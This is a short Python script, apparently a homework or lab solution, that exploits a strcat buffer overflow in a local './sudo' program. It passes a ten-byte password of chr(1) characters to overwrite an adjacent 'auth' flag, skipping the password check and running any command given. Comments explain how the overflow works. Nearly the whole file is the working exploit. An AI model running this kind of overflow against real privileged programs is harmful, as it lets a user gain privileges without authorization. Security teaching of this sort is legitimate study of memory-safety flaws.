import os, sys


PATH_TO_SUDO = './sudo'


def run_command(cmd):
    # Your code here

    # The buff have size of 20. The buff is full from index 0 to 11.
    # We can try password of size 10.
    # The strcat concatenate two string without checking the destination string size, so if we put password with 10 chars, it's will override auth.
    # if auth == 1, the check_password function return 1 and will run the command we wanted.
    
    password = chr(1) * 10
  
    os.execl (PATH_TO_SUDO, PATH_TO_SUDO, password, cmd)
    return



def main(argv):
    if not len(argv) == 2:
        print 'Usage: %s <command>' % argv[0]
        sys.exit(1)

    cmd = argv[1]
    run_command(cmd)


if __name__ == '__main__':
    main(sys.argv)
